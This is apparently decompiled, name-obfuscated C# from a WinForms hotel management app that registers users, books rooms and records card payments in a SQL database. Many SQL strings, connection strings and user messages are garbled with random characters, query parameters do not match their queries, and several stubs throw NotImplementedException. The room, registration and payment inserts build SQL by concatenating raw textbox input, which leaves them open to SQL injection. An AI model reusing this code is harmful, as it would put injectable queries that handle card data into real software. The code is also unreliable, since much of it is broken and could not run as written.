using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Qb9n3;
using Sw84Mc;
using c6J5Kz;
using e8JYt9;
using g2HAj9;
using g9MJo6;
using t1AKx6;
using w6Y9Jm;

namespace Fe2m3G;

public class Ld56Ey
{
	private object Admin_login;

	private SqlCommand cmd;

	private object TextBoxFName;

	private object ComboBoxGender;

	private object TextBoxNumber;

	private object TextBoxRoomID;

	private object TextBoxBookingID;

	private object ComboBoxRoomType;

	private object TextBoxRoomPrice;

	private object ComboBoxRoomAvailable;

	private object Admin_Hmepage;

	private object Database2DataSet3;

	private object TextBoxPaymentID;

	private object TextBoxCardNumber;

	private object Database2DataSet2;

	private Bi18Zt.Zw0c9J zw0c9J_0 = new Bi18Zt.Zw0c9J();

	public Ld56Ey()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		object obj = (object)new SqlConnection();
		zw0c9J_0.sqlConnection_0 = (SqlConnection)obj;
		cmd = new SqlCommand();
	}

	private void Kd0n5M(object sender, EventArgs e)
	{
		o9R4Pa();
		a6GYz3.Rd7w8L();
	}

	private void j9YXe8(object sender, EventArgs e)
	{
		o9R4Pa();
		Bi18Zt.Ya57Ek();
	}

	private void d4E3Rm(object sender, EventArgs e)
	{
		o9R4Pa();
		NewLateBinding.LateCall(Admin_login, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void n4ZSr2(object sender, EventArgs e)
	{
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Expected O, but got Unknown
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_020a: Unknown result type (might be due to invalid IL or missing references)
		zw0c9J_0.sqlConnection_0.set_ConnectionString("Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=C:\\Users\\allot\\OneDrive\\Desktop\\Hotel management\\Hotel management\\Database1.mdf;Integrated Security=True");
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(zw0c9J_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			MessageBox.Show("Empty Id");
			return;
		}
		ICloneable cloneable = (ICloneable)new SqlCommand("UPDATE register SET Firstname = @fname ,Lastname = @lname , Gender= @gender, Phonenumber= @pnumber,  Password=@password WHERE Username = @username", zw0c9J_0.sqlConnection_0);
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).get_Parameters().Add("@fname", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxFName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)cloneable).get_Parameters().Add("@lname", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(zw0c9J_0.object_1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)cloneable).get_Parameters().Add("@gender", SqlDbType.VarChar).set_Value((object)NewLateBinding.LateGet(ComboBoxGender, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
		((SqlCommand)cloneable).get_Parameters().Add("@pnumber", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).get_Parameters().Add("@password", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(zw0c9J_0.object_2, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).get_Parameters().Add("@username", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(zw0c9J_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		zw0c9J_0.sqlConnection_0.Open();
		if (((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("User Login Details Updated");
		}
		else
		{
			MessageBox.Show("User login Details Not Updated");
		}
		zw0c9J_0.sqlConnection_0.Close();
	}

	private void Bs6w8J(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		DbConnection dbConnection = (DbConnection)new SqlConnection("Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=C:\\Users\\allot\\OneDrive\\Desktop\\Hotel management\\Hotel management\\Database1.mdf;Integrated Security=True");
		object obj = (object)new SqlCommand("DELETE FROM register WHERE Username = @username", (SqlConnection)dbConnection);
		((SqlCommand)((obj is SqlCommand) ? obj : null)).get_Parameters().Add("@username", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(zw0c9J_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Open();
		if (((SqlCommand)((obj is SqlCommand) ? obj : null)).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("User login details Deleted");
		}
		else
		{
			MessageBox.Show("User login details Not Deleted");
		}
		((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Close();
	}

	private void z7A5Ws(object sender, EventArgs e)
	{
		d3LYm9.n4E7Cp();
	}

	private void z2BTw0(object sender, EventArgs e)
	{
		Rz36Xi();
		NewLateBinding.LateCall(zw0c9J_0.object_3, (Type)null, "EndEdit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object object_ = zw0c9J_0.object_4;
		object[] array = new object[1];
		ref object object_2 = ref zw0c9J_0.object_5;
		array[0] = object_2;
		Array array2 = array;
		bool[] obj = new bool[1] { true };
		object obj2 = obj;
		NewLateBinding.LateCall(object_, (Type)null, "UpdateAll", array, (string[])null, (Type[])null, obj, true);
		if (((bool[])obj2)[0])
		{
			object_2 = RuntimeHelpers.GetObjectValue((array2 as object[])[0]);
		}
	}

	private void Rz36Xi()
	{
		throw new NotImplementedException();
	}

	private void t1R4My(object sender, EventArgs e)
	{
		object object_ = zw0c9J_0.object_6;
		object[] array = new object[1];
		object object_2 = zw0c9J_0.object_5;
		array[0] = NewLateBinding.LateGet(object_2, (Type)null, "Register", new object[0], (string[])null, (Type[])null, (bool[])null);
		Array array2 = array;
		bool[] obj = new bool[1] { true };
		object obj2 = obj;
		NewLateBinding.LateCall(object_, (Type)null, "Fill", array, (string[])null, (Type[])null, obj, true);
		if (((bool[])obj2)[0])
		{
			NewLateBinding.LateSetComplex(object_2, (Type)null, "Register", new object[1] { (array2 as object[])[0] }, (string[])null, (Type[])null, true, false);
		}
	}

	private void p8J6Cq(object sender, EventArgs e)
	{
	}

	private void x1K2Tg(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0217: Unknown result type (might be due to invalid IL or missing references)
		//IL_021d: Expected O, but got Unknown
		//IL_037b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0384: Unknown result type (might be due to invalid IL or missing references)
		//IL_039b: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c7: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ICloneable cloneable = (ICloneable)new SqlConnection();
			ICloneable cloneable2 = (ICloneable)new SqlCommand();
			((SqlConnection)((cloneable is SqlConnection) ? cloneable : null)).set_ConnectionString("");
			((SqlConnection)((cloneable is SqlConnection) ? cloneable : null)).Open();
			((SqlCommand)cloneable2).set_Connection((SqlConnection)((cloneable is SqlConnection) ? cloneable : null));
			((SqlCommand)cloneable2).set_CommandType(CommandType.Text);
			((SqlCommand)cloneable2).set_CommandText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"'", NewLateBinding.LateGet(TextBoxRoomID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' ")));
			IDataRecord dataRecord = (IDataRecord)((SqlCommand)cloneable2).ExecuteReader();
			if (((SqlDataReader)dataRecord).get_HasRows())
			{
				Interaction.MsgBox((object)"", (MsgBoxStyle)16, (object)null);
				((SqlConnection)cloneable).Close();
			}
			else
			{
				((SqlConnection)cloneable).Close();
				((SqlConnection)cloneable).Open();
				cloneable2 = (ICloneable)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)" ('", NewLateBinding.LateGet(TextBoxRoomID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxBookingID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(zw0c9J_0.object_7, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), (object)NewLateBinding.LateGet(ComboBoxRoomType, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"','"), (object)NewLateBinding.LateGet(zw0c9J_0.object_8, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"','"), NewLateBinding.LateGet(TextBoxRoomPrice, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), (object)NewLateBinding.LateGet(ComboBoxRoomAvailable, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"')")), (SqlConnection)((cloneable is SqlConnection) ? cloneable : null));
				if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxRoomID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxBookingID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(zw0c9J_0.object_7, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), (object)(Operators.CompareString(NewLateBinding.LateGet(ComboBoxRoomType, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString(), "", false) == 0)), (object)(Operators.CompareString(NewLateBinding.LateGet(zw0c9J_0.object_8, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString(), "", false) == 0)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxRoomPrice, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), (object)(Operators.CompareString(NewLateBinding.LateGet(ComboBoxRoomAvailable, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString(), "", false) == 0))))
				{
					MessageBox.Show("");
				}
				else
				{
					((SqlCommand)cloneable2).ExecuteNonQuery();
					Interaction.MsgBox((object)"", (MsgBoxStyle)64, (object)"");
				}
				((SqlConnection)cloneable).Close();
			}
			((SqlConnection)((cloneable is SqlConnection) ? cloneable : null)).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void Bc67Ny(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0206: Unknown result type (might be due to invalid IL or missing references)
		//IL_021a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0227: Unknown result type (might be due to invalid IL or missing references)
		DbConnection dbConnection = (DbConnection)new SqlConnection("Dated Security=True");
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(TextBoxRoomID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			MessageBox.Show("Empty Id");
			return;
		}
		DbCommand dbCommand = (DbCommand)new SqlCommand("UPDATRE roomid = @id", (SqlConnection)(object)((dbConnection is SqlConnection) ? dbConnection : null));
		((SqlCommand)dbCommand).get_Parameters().Add("@boingid", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxBookingID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)dbCommand).get_Parameters().Add("@rom", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(zw0c9J_0.object_7, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).get_Parameters().Add("@rooype", SqlDbType.VarChar).set_Value((object)NewLateBinding.LateGet(ComboBoxRoomType, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
		((SqlCommand)dbCommand).get_Parameters().Add("@bedoice", SqlDbType.VarChar).set_Value((object)NewLateBinding.LateGet(zw0c9J_0.object_8, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
		((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).get_Parameters().Add("@roorice", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxRoomPrice, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).get_Parameters().Add("@", SqlDbType.VarChar).set_Value((object)NewLateBinding.LateGet(ComboBoxRoomAvailable, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
		((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).get_Parameters().Add("@i", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxRoomID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Open();
		if (((SqlCommand)dbCommand).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("Ro Updsdryyated");
		}
		else
		{
			MessageBox.Show("Rodgeryyted");
		}
		((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Close();
	}

	private void b5T8Qf(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		DbConnection dbConnection = (DbConnection)new SqlConnection("eryru6i6");
		ICloneable cloneable = (ICloneable)new SqlCommand("eryu6u656u= @id", (SqlConnection)(object)((dbConnection is SqlConnection) ? dbConnection : null));
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).get_Parameters().Add("@ityutyutd", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxRoomID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)dbConnection).Open();
		if (((SqlCommand)cloneable).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("Roo45745745m utyyur6Deleted");
		}
		else
		{
			MessageBox.Show("Room45767557657 N756ot 56765757Deleted");
		}
		((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Close();
	}

	private void Hw7j6C(object sender, EventArgs e)
	{
		o9R4Pa();
		NewLateBinding.LateCall(Admin_Hmepage, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void Wr7e6Y(object sender, EventArgs e)
	{
		t1N8Ef.n8E6Hg();
	}

	private void Ed9y5N(object sender, EventArgs e)
	{
		Rz36Xi();
		NewLateBinding.LateCall(f5T6Xi(), (Type)null, "EndEdit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object object_ = zw0c9J_0.object_4;
		object[] array = new object[1];
		ref object database2DataSet = ref Database2DataSet3;
		array[0] = database2DataSet;
		object obj = array;
		bool[] obj2 = new bool[1] { true };
		object obj3 = obj2;
		NewLateBinding.LateCall(object_, (Type)null, "UpdateAll", array, (string[])null, (Type[])null, obj2, true);
		if ((obj3 as bool[])[0])
		{
			database2DataSet = RuntimeHelpers.GetObjectValue(((object[])obj)[0]);
		}
	}

	private object f5T6Xi()
	{
		throw new NotImplementedException();
	}

	private void f6G2Zo(object sender, EventArgs e)
	{
		object object_ = zw0c9J_0.object_9;
		object[] array = new object[1];
		object database2DataSet = Database2DataSet3;
		array[0] = NewLateBinding.LateGet(database2DataSet, (Type)null, "Room", new object[0], (string[])null, (Type[])null, (bool[])null);
		Array array2 = array;
		bool[] obj = new bool[1] { true };
		Array array3 = obj;
		NewLateBinding.LateCall(object_, (Type)null, "Fill", array, (string[])null, (Type[])null, obj, true);
		if ((array3 as bool[])[0])
		{
			NewLateBinding.LateSetComplex(database2DataSet, (Type)null, "Room", new object[1] { (array2 as object[])[0] }, (string[])null, (Type[])null, true, false);
		}
	}

	internal static void Sq8r5A()
	{
		throw new NotImplementedException();
	}

	private void z5B0Xw(object sender, EventArgs e)
	{
	}

	private void Hy60Pq(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f3: Expected O, but got Unknown
		//IL_01ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Expected O, but got Unknown
		//IL_0313: Unknown result type (might be due to invalid IL or missing references)
		//IL_031c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0333: Unknown result type (might be due to invalid IL or missing references)
		//IL_0345: Unknown result type (might be due to invalid IL or missing references)
		//IL_036a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			object obj = (object)new SqlConnection();
			ICloneable cloneable = (ICloneable)new SqlCommand();
			((SqlConnection)obj).set_ConnectionString("dsfsdtyu58");
			((SqlConnection)((obj is SqlConnection) ? obj : null)).Open();
			((SqlCommand)cloneable).set_Connection((SqlConnection)((obj is SqlConnection) ? obj : null));
			((SqlCommand)cloneable).set_CommandType(CommandType.Text);
			((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).set_CommandText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"jhjo78jyj", NewLateBinding.LateGet(zw0c9J_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' ")));
			object obj2 = ((SqlCommand)cloneable).ExecuteReader();
			if (((SqlDataReader)((obj2 is SqlDataReader) ? obj2 : null)).get_HasRows())
			{
				Interaction.MsgBox((object)"sd46", (MsgBoxStyle)16, (object)null);
				((SqlConnection)((obj is SqlConnection) ? obj : null)).Close();
			}
			else
			{
				((SqlConnection)obj).Close();
				((SqlConnection)obj).Open();
				cloneable = (ICloneable)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"sdgeruii('", NewLateBinding.LateGet(TextBoxFName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(zw0c9J_0.object_1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), (object)NewLateBinding.LateGet(ComboBoxGender, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"','"), NewLateBinding.LateGet(TextBoxNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(zw0c9J_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(zw0c9J_0.object_2, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"')")), (SqlConnection)obj);
				if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxFName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(zw0c9J_0.object_1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), (object)(Operators.CompareString(NewLateBinding.LateGet(ComboBoxGender, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString(), "", false) == 0)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(zw0c9J_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(zw0c9J_0.object_2, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
				{
					MessageBox.Show("Pleasiuhioujoiijioope enter the dkjfdrew57etails");
				}
				else
				{
					((SqlCommand)cloneable).ExecuteNonQuery();
					Interaction.MsgBox((object)"Succfgxrerssfully Regiuiojojistered.", (MsgBoxStyle)64, (object)"Sugcfy898ccess");
					o9R4Pa();
					Bi18Zt.Ya57Ek();
				}
				((SqlConnection)obj).Close();
			}
			((SqlConnection)((obj is SqlConnection) ? obj : null)).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"kkkkkpo9", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void q0QLe1(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c1: Expected O, but got Unknown
		//IL_02a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02db: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f5: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			object obj = (object)new SqlConnection();
			object obj2 = (object)new SqlCommand();
			((SqlConnection)((obj is SqlConnection) ? obj : null)).set_ConnectionString("fsjdhfsjdghsuewt89we900tt oierru9w8t ejgj'o9oa8g aljgrii8ag0ir oayttajgh8uuar");
			((SqlConnection)((obj is SqlConnection) ? obj : null)).Open();
			((SqlCommand)((obj2 is SqlCommand) ? obj2 : null)).set_Connection((SqlConnection)((obj is SqlConnection) ? obj : null));
			((SqlCommand)obj2).set_CommandType(CommandType.Text);
			((SqlCommand)((obj2 is SqlCommand) ? obj2 : null)).set_CommandText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"select * asffsgseyeurtrturuymentid='", NewLateBinding.LateGet(TextBoxPaymentID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' ")));
			object obj3 = ((SqlCommand)obj2).ExecuteReader();
			if (((SqlDataReader)obj3).get_HasRows())
			{
				Interaction.MsgBox((object)"Paymurturuent Alrrurueeady Regisrturttyrutered", (MsgBoxStyle)16, (object)null);
				((SqlConnection)((obj is SqlConnection) ? obj : null)).Close();
			}
			else
			{
				((SqlConnection)obj).Close();
				((SqlConnection)obj).Open();
				obj2 = (object)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"inserteryreyeyrtutrur into sdfsgrerypayments vtutrurturtualues('", NewLateBinding.LateGet(TextBoxPaymentID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(zw0c9J_0.object_10, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(zw0c9J_0.object_11, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxCardNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(zw0c9J_0.object_12, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"')")), (SqlConnection)((obj is SqlConnection) ? obj : null));
				if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxPaymentID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(zw0c9J_0.object_10, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(zw0c9J_0.object_11, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxCardNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(zw0c9J_0.object_12, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
				{
					MessageBox.Show("Pleasetrurtutrutru enter the trutrurturtywdetails");
				}
				else
				{
					((SqlCommand)obj2).ExecuteNonQuery();
					Interaction.MsgBox((object)"SuccersWRVQW46N575M8sfully Regis57959,tered.", (MsgBoxStyle)64, (object)"Succr46m880.69p9.7ess");
				}
				((SqlConnection)obj).Close();
			}
			((SqlConnection)obj).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
